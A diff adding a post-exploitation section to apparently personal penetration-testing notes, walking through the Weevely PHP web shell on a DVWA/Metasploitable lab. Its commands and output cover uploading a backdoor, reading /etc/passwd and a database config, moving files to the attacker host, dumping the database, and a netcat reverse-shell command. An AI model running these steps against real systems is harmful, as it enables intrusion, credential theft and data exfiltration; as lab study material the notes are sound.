@@ -853,6 +853,373 @@ ZAD Attack Proxy - ZAP
 
 Used tool - ZAP
 
+Post Exploitation
+----------------
+
+"Post exploitation by using Weevely"
+
+Basic Bash to Weevely
+
+1) generate weevely backdoor.
+2) upload it to any server(make sure you have a direct url)
+3) download it from target server.
+4) connect to it from Kali
+
+> weevely [target_address]/dvwa/hackable/uploads/[file_name].php [password]
+
+weevely > ls
+
+The remote script execution triggers an error 500, check script and payload integrity
+114-1149126_apple-clipart-black-and-white-image-small-clip.png
+backdoor.php
+dvwa_email.png
+index.jpeg
+lorem_text.txt
+
+Weevely Basic
+
+1) run any sheel cmd directly
+2) run weevely funcs
+3) list all weevely funcs
+4) get help about specific func
+
+weevely > whoami
+weevely > [func_name]
+weevely > help
+weevely > [func_name] -h
+
+www-data@192.168.104.6:/var/www/dvwa/hackable/uploads $ help
+
+The remote script execution triggers an error 500, check script and payload integrity
+
+ :net_ifconfig                 Get network interfaces addresses.                                    
+ :net_phpproxy                 Install PHP proxy on the target.                                     
+ :net_curl                     Perform a curl-like HTTP request.                                    
+ :net_mail                     Send mail.                                                           
+ :net_proxy                    Run local proxy to pivot HTTP/HTTPS browsing through the target.     
+ :net_scan                     TCP Port scan.                                                       
+ :sql_console                  Execute SQL query or run console.                                    
+ :sql_dump                     Multi dbms mysqldump replacement.                                    
+ :file_gzip                    Compress or expand gzip files.                                       
+ :file_clearlog                Remove string from a file.                                           
+ :file_touch                   Change file timestamp.                                               
+ :file_cp                      Copy single file.                                                    
+ :file_cd                      Change current working directory.                                    
+ :file_download                Download file from remote filesystem.                                
+ :file_mount                   Mount remote filesystem using HTTPfs.                                
+ :file_check                   Get attributes and permissions of a file.                            
+ :file_enum                    Check existence and permissions of a list of paths.                  
+ :file_zip                     Compress or expand zip files.                                        
+ :file_upload2web              Upload file automatically to a web folder and get corresponding URL. 
+ :file_edit                    Edit remote file on a local editor.                                  
+ :file_webdownload             Download an URL.                                                     
+ :file_read                    Read remote file from the remote filesystem.                         
+ :file_bzip2                   Compress or expand bzip2 files.                                      
+ :file_ls                      List directory content.                                              
+ :file_upload                  Upload file to remote filesystem.                                    
+ :file_rm                      Remove remote file.                                                  
+ :file_find                    Find files with given names and attributes.                          
+ :file_tar                     Compress or expand tar archives.                                     
+ :file_grep                    Print lines matching a pattern in multiple files.                    
+ :backdoor_tcp                 Spawn a shell on a TCP port.                                         
+ :backdoor_reversetcp          Execute a reverse TCP shell.                                         
+ :bruteforce_sql               Bruteforce SQL database.                                             
+ :system_extensions            Collect PHP and webserver extension list.                            
+ :system_procs                 List running processes.                                              
+ :system_info                  Collect system information.                                          
+ :audit_filesystem             Audit the file system for weak permissions.                          
+ :audit_disablefunctionbypass  Bypass disable_function restrictions with mod_cgi and .htaccess.     
+ :audit_suidsgid               Find files with SUID or SGID flags.                                  
+ :audit_phpconf                Audit PHP configuration.                                             
+ :audit_etcpasswd              Read /etc/passwd with different techniques.                          
+ :shell_su                     Execute commands with su.                                            
+ :shell_php                    Execute PHP commands.                                                
+ :shell_sh                     Execute shell commands. 
+
+weevely > :help
+
+weevely > system_info
+
+weevely > :system_info
+
+The remote script execution triggers an error 500, check script and payload integrity
+The remote script execution triggers an error 500, check script and payload integrity
++--------------------+--------------------------------------------------------------------------------+
+| document_root      | /var/www/                                                                      |
+| whoami             | www-data                                                                       |
+| hostname           |                                                                                |
+| pwd                | /var/www/dvwa/hackable/uploads                                                 |
+| open_basedir       |                                                                                |
+| safe_mode          | False                                                                          |
+| script             | /dvwa/hackable/uploads/backdoor.php                                            |
+| script_folder      | /var/www/dvwa/hackable/uploads                                                 |
+| uname              | Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 |
+| os                 | Linux                                                                          |
+| client_ip          | 192.168.104.3                                                                  |
+| max_execution_time | 30                                                                             |
+| php_self           | /dvwa/hackable/uploads/backdoor.php                                            |
+| dir_sep            | /                                                                              |
+| php_version        | 5.2.4-2ubuntu5.10                                                              |
++--------------------+--------------------------------------------------------------------------------+
+
+weevely > audit_etcpasswd -h
+
+The remote script execution triggers an error 500, check script and payload integrity
+usage: audit_etcpasswd [-h] [-real] [-vector {posix_getpwuid,file,fread,file_get_contents,base64}]
+
+Read /etc/passwd with different techniques.
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -real                 Filter only real users
+  -vector {posix_getpwuid,file,fread,file_get_contents,base64}
+
+weevely > audit_etcpasswd -vector posix_getpwuid
+
+The remote script execution triggers an error 500, check script and payload integrity
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+dhcp:x:101:102::/nonexistent:/bin/false
+syslog:x:102:103::/home/syslog:/bin/false
+klog:x:103:104::/home/klog:/bin/false
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+bind:x:105:113::/var/cache/bind:/bin/false
+postfix:x:106:115::/var/spool/postfix:/bin/false
+ftp:x:107:65534::/home/ftp:/bin/false
+postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
+tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
+distccd:x:111:65534::/:/bin/false
+telnetd:x:112:120::/nonexistent:/bin/false
+proftpd:x:113:65534::/var/run/proftpd:/bin/false
+statd:x:114:65534::/var/lib/nfs:/bin/false
+msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
+service:x:1002:1002:,,,:/home/service:/bin/bash
+
+weevely > whoami
+weevely > shell_sh -h
+
+usage: shell_sh [-h] [-stderr_redirection STDERR_REDIRECTION]
+                [-vector {system,passthru,shell_exec,exec,popen,proc_open,python_eval,perl_system,pcntl}]
+                command [command ...]
+
+Execute shell commands.
+
+positional arguments:
+  command               Shell command
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -stderr_redirection STDERR_REDIRECTION
+  -vector {system,passthru,shell_exec,exec,popen,proc_open,python_eval,perl_system,pcntl}
+
+weevely > shell_sh [command]
+weevely > shell_sh whoami
+
+weevely > shell_sh -vector [vector] [command]
+
+weevely > file_download -h
+
+The remote script execution triggers an error 500, check script and payload integrity
+usage: file_download [-h] [-vector {file,fread,file_get_contents,base64}] rpath lpath
+
+Download file from remote filesystem.
+
+positional arguments:
+  rpath                 Remote file path
+  lpath                 Local file path
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -vector {file,fread,file_get_contents,base64}
+
+weevely > file_download -vector [vector] [file_name] -host [host] [location_to_store_file]
+
+"In hacker's host, create a dir to receive downloaded file"
+
+> cd ../..
+> ls
+
+bin   dev  initrd.img      lib    lib64   lost+found  mnt  proc  run   srv  tmp  var      vmlinuz.old
+boot  etc  home    initrd.img.old  lib32  libx32  media       opt  root  sbin  sys  usr  vmlinuz
+
+> sudo mkdir hahaha && sudo chmod -R 755 hahaha
+
+bin   dev  hahaha  initrd.img      lib    lib64   lost+found  mnt  proc  run   srv  tmp  var      vmlinuz.old
+boot  etc  home    initrd.img.old  lib32  libx32  media       opt  root  sbin  sys  usr  vmlinuz
+
+"Run weevely with sudo cmd"
+
+weevely > file_download -vector file lorem_text.txt /hahaha/lorem_text.txt
+
+The remote script execution triggers an error 500, check script and payload integrity
+
+weevely > file_upload -h
+
+The remote script execution triggers an error 500, check script and payload integrity
+usage: file_upload [-h] [-force] [-content CONTENT] [-vector {file_put_contents,fwrite}] [lpath] rpath
+
+Upload file to remote filesystem.
+
+positional arguments:
+  lpath                 Local file path
+  rpath                 Remote file path
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -force                Force overwrite
+  -content CONTENT      Optionally specify the file content
+  -vector {file_put_contents,fwrite}
+
+weevely > file_upload /hahaha/lorem_text.txt ./lorem_text_uploaded.txt
+
+The remote script execution triggers an error 500, check script and payload integrity
+True
+
+weevely > ls -l
+
+The remote script execution triggers an error 500, check script and payload integrity
+total 96
+-rw------- 1 www-data www-data 54593 Aug 22 10:11 114-1149126_apple-clipart-black-and-white-image-small-clip.png
+-rw------- 1 www-data www-data   744 Aug 29 09:58 backdoor.php
+-rw-r--r-- 1 www-data www-data   667 Mar 16  2010 dvwa_email.png
+-rw------- 1 www-data www-data  8573 Aug 22 10:51 index.jpeg
+-rw------- 1 www-data www-data    10 Aug 22 11:26 lorem_text.jpg
+-rw------- 1 www-data www-data    10 Aug 22 11:25 lorem_text.svg
+-rw------- 1 www-data www-data    10 Aug 22 10:12 lorem_text.txt
+-rw-r--r-- 1 www-data www-data    10 Aug 29 10:50 lorem_text_uploaded.txt
+
+weevely > backdoor_reversetcp -h
+
+The remote script execution triggers an error 500, check script and payload integrity
+usage: backdoor_reversetcp [-h] [-shell SHELL] [-no-autonnect]
+                           [-vector {netcat_bsd,netcat,python,devtcp,perl,ruby,telnet,python_pty}]
+                           lhost port
+
+Execute a reverse TCP shell.
+
+positional arguments:
+  lhost                 Local host
+  port                  Port to spawn
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -shell SHELL          Specify shell
+  -no-autonnect         Skip autoconnect
+  -vector {netcat_bsd,netcat,python,devtcp,perl,ruby,telnet,python_pty}
+
+weevely > backdoor_reversetcp -vector netcat [your_ip] [your_port]
+
+Accessing The Database
+
+1) Find and read config file.
+2) Use sql_console to drop to sql console or sql_dump to dump the whole database.
+    e.g - sql_console -h, sql_dump -h
+
+weevely > sql_console -h
+
+The remote script execution triggers an error 500, check script and payload integrity
+usage: sql_console [-h] [-user USER] [-passwd PASSWD] [-host [HOST]] [-dbms {mysql,pgsql}] [-database DATABASE]
+                   [-query QUERY] [-encoding ENCODING]
+
+Execute SQL query or run console.
+
+optional arguments:
+  -h, --help           show this help message and exit
+  -user USER           SQL username
+  -passwd PASSWD       SQL password
+  -host [HOST]         Db host or host:port
+  -dbms {mysql,pgsql}  Db type
+  -database DATABASE   Database name (Only PostgreSQL)
+  -query QUERY         Execute a single query
+  -encoding ENCODING   Db text encoding
+
+weevely > sql_dmp -h
+
+The remote script execution triggers an error 500, check script and payload integrity
+usage: sql_dump [-h] [-dbms {mysql,pgsql,sqlite,dblib}] [-host [HOST]] [-lpath LPATH]
+                [-vector {mysqldump_sh,mysqldump_php}]
+                db user passwd
+
+Multi dbms mysqldump replacement.
+
+positional arguments:
+  db                    Db to dump
+  user                  SQL username
+  passwd                SQL password
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -dbms {mysql,pgsql,sqlite,dblib}
+                        Db type. Vector 'mysqldump_sh' supports only 'mysql'.
+  -host [HOST]          Db host or host:port
+  -lpath LPATH          Dump to local path (default: temporary file)
+  -vector {mysqldump_sh,mysqldump_php}
+
+weevely > cd /var/www/dvwa/config
+
+weevely > file_read -vector file config.inc.php
+
+The remote script execution triggers an error 500, check script and payload integrity
+<?php
+
+# If you are having problems connecting to the MySQL database and all of the variables below are correct
+# try changing the 'db_server' variable from localhost to 127.0.0.1. Fixes a problem due to sockets.
+# Thanks to digininja for the fix.
+
+# Database management system to use
+
+$DBMS = 'MySQL';
+#$DBMS = 'PGSQL';
+
+# Database variables
+
+$_DVWA = array();
+$_DVWA[ 'db_server' ] = 'localhost';
+$_DVWA[ 'db_database' ] = 'd';
+$_DVWA[ 'db_user' ] = 'root';
+$_DVWA[ 'db_password' ] = '';
+
+# Only needed for PGSQL
+$_DVWA[ 'db_port' ] = '5432'; 
+
+?>
+
+weevely > sql_dump -dbms mysql -host localhost -lpath /hahaha/sql_dump.txt -vector mysqldump_sh dvwa root ''
+
+The remote script execution triggers an error 500, check script and payload integrity
+SQL dump saved to '/hahaha/sql_dump.txt'
+
+"Open and view sql_dump.txt file in notepad."
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
